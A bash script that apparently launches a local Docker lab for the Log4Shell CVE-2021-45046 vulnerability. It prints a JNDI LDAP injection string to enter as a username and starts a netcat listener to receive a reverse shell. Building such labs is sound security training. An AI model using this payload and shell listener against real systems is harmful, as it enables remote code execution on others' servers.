
#!/bin/bash

# custom signal handler
function sigint_handler() {
  echo "Stopping docker containers..."
  docker stop log4shell_cve-45046_1
  docker stop log4shell_exploit-server_1
  echo "Done!"
  exit 1
}

trap 'sigint_handler' 2

docker-compose up -d cve-45046 exploit-server
echo "Enter ${jndi:ldap://localhost:1389/a} as Username in webpage to trigger exploit"
echo "Starting netcat server to listen for shell connections..." 

nc -lvnp 9001